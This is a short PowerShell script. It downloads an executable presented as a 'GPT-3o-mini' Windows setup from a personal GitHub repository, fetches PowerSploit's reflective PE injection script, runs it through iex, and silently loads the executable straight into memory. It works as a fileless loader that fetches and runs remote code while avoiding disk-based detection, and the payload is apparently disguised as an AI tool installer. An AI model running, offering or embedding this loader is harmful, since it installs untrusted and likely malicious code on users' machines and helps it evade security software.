try {
    $exeBytes = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/nathan-ingram10/GPT-3o-mini/main/GPT-3o_win-x64_setup.exe')  
    $script = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
    iex $script
    Invoke-ReflectivePEInjection -PEBytes $exeBytes -ExeArgs '/S'  # Silent
} catch { Write-Host $_.Message -ForegroundColor Red }
